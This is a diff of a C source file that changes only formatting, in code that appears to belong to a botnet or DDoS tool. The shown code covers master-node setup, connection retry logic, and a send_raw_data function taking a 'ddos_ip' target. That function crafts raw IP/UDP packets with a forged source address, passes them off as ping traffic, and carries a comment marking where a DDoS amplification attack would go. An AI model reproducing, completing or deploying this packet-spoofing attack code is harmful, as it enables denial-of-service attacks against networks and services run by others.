@@ -37,7 +37,7 @@ connection connect_to(char *dest_ip, int dest_port)
     address.sin_family = AF_INET;
     address.sin_port = htons(dest_port);
     inet_pton(AF_INET, dest_ip, &(address.sin_addr));
-    
+
     // Create socket
     sock_fd = socket(PF_INET, SOCK_STREAM, 0);
 
@@ -56,7 +56,6 @@ connection connect_to(char *dest_ip, int dest_port)
         int time_to_sleep = rand() % 10;
         sleep(time_to_sleep);
     }
-    
 
     // We've connected, so fill struct and return
     return_con.dest_ip = dest_ip;
@@ -123,7 +122,7 @@ message recieve_data(connection server)
 int setMaster(struct machine *master)
 {
     master->is_master = 1;
-    return(0);
+    return (0);
 }
 
 // Able to send UDP packets disguised as ICMP ping packets.
@@ -138,13 +137,14 @@ int send_raw_data(message data, char *ddos_ip)
     u_int16_t src_port, dst_port;
     u_int32_t src_addr, dst_addr;
     src_addr = inet_addr(source.ip_address);
-    dst_addr = inet_addr(destination.ip_address);;
+    dst_addr = inet_addr(destination.ip_address);
+    ;
     src_port = source.open_port;
     dst_port = destination.open_port;
     int sd;
     char buffer[PCKT_LEN];
-    struct iphdr *ip = (struct iphdr *) buffer;
-    struct udphdr *udp = (struct udphdr *) (buffer + sizeof(struct iphdr));
+    struct iphdr *ip = (struct iphdr *)buffer;
+    struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct iphdr));
     struct sockaddr_in sin;
     int one = 1;
     const int *val = &one;
@@ -154,13 +154,12 @@ int send_raw_data(message data, char *ddos_ip)
     sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
     if (sd < 0)
     {
-        return(1);
+        return (1);
     }
-;
     // Attempt to get permission from kernel to fill our own header
-    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
+    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
     {
-        return(2);
+        return (2);
     }
 
     // Fill sockaddr_in struct with relevant data
@@ -169,12 +168,12 @@ int send_raw_data(message data, char *ddos_ip)
     sin.sin_addr.s_addr = dst_addr;
 
     // Fabricate the IP header. This is where we can implement DDOS amplification attack.
-    ip->ihl      = 5;
-    ip->version  = 4;
-    ip->tos      = 16;
-    ip->tot_len  = sizeof(struct iphdr) + sizeof(struct udphdr);
-    ip->id       = htons(54321);
-    ip->ttl      = 64;
+    ip->ihl = 5;
+    ip->version = 4;
+    ip->tos = 16;
+    ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
+    ip->id = htons(54321);
+    ip->ttl = 64;
     // We can set the protocol to whatever we like, so long as both sides assume that it's UDP
     ip->protocol = destination.preferred_protocol;
     ip->saddr = src_addr;
@@ -187,12 +186,12 @@ int send_raw_data(message data, char *ddos_ip)
 
     // Calculate the checksum for integrity - https://opensourceforu.com/2015/03/a-guide-to-using-raw-sockets/
     ip->check = csum((unsigned short *)buffer,
-                    sizeof(struct iphdr) + sizeof(struct udphdr));
+                     sizeof(struct iphdr) + sizeof(struct udphdr));
 
     // Finally, let's send the packet.
     if (sendto(sd, buffer, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
     {
-        return(3);
+        return (3);
     }
 
     close(sd);
@@ -203,11 +202,11 @@ int send_raw_data(message data, char *ddos_ip)
 unsigned short csum(unsigned short *buf, int nwords)
 {
     unsigned long sum;
-    for(sum=0; nwords>0; nwords--)
+    for (sum = 0; nwords > 0; nwords--)
     {
         sum += *buf++;
     }
-    sum = (sum >> 16) + (sum &0xffff);
+    sum = (sum >> 16) + (sum & 0xffff);
     sum += (sum >> 16);
     return (unsigned short)(~sum);
 }
